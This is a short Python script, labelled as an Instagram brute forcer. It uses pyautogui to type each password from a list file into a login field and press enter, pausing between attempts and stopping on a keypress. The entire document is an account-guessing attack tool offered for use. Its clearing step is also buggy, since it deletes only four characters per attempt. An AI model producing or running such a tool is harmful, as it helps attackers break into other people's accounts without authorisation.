#brute forcer for instagram
import pyautogui, time, keyboard
time.sleep(7)
f= open("pass.txt",'r')
for x in f:
	pyautogui.write(x)
	pyautogui.press("enter")
	time.sleep(2)
	pyautogui.press("backspace")
	pyautogui.press("backspace")
	pyautogui.press("backspace")
	pyautogui.press("backspace")
	if keyboard.is_pressed("q"):
		print(x)
		break
